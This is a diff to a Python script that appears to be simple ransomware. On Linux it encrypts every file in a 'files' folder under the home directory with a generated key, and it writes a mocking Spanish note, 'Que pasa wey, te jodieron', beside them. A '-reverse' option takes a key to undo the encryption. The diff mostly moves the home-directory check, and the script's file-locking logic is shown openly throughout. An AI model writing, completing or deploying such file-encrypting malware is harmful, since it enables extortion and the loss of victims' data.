@@ -32,9 +32,9 @@ def encrypt(items, key, silent):
 
 if __name__ == '__main__':
 	silent = False
-	if system() == "Linux" and os.getcwd().endswith('home'):
+	if system() == "Linux":
 		if len(argv) > 2:
-			if len(argv) == 3 and (argv[1] == "-reverse" or argv[1] == "-r"):
+			if len(argv) == 3 and (argv[1] == "-reverse" or argv[1] == "-r") and os.getcwd().endswith('home'):
 				if len(argv[2]) < 16:
 					print('Key is incompleted')
 				else:
@@ -54,19 +54,20 @@ if __name__ == '__main__':
 			elif len(argv) == 2 and silent == False:
 				print('Too many arguments')
 			else:
-				path_to_encrypt = os.getcwd() + '/files'
-				items = os.listdir(path_to_encrypt)
-				full_path = [path_to_encrypt + '/' + item for item in items]
+				if os.getcwd().endswith('home'):
+					path_to_encrypt = os.getcwd() + '/files'
+					items = os.listdir(path_to_encrypt)
+					full_path = [path_to_encrypt + '/' + item for item in items]
 
-				key_generator()
-				key = key_charge()
+					key_generator()
+					key = key_charge()
 				
-				# Aqui deberiamos de comprobar si esta en HOME
-				# if 'HOME' in full_path:
-				encrypt(full_path, key, silent)
+					encrypt(full_path, key, silent)
 				
-				with open(path_to_encrypt + '/' + 'msg.txt', 'w') as file:
-					file.write('Que pasa wey, te jodieron\n')
-					file.close()
+					with open(path_to_encrypt + '/' + 'msg.txt', 'w') as file:
+						file.write('Que pasa wey, te jodieron\n')
+						file.close()
+				else:
+					print("You are not in the home folder")
 	else:
-		print("Your system is not Linux or you are not in the home")
+		print("Your system is not Linux")
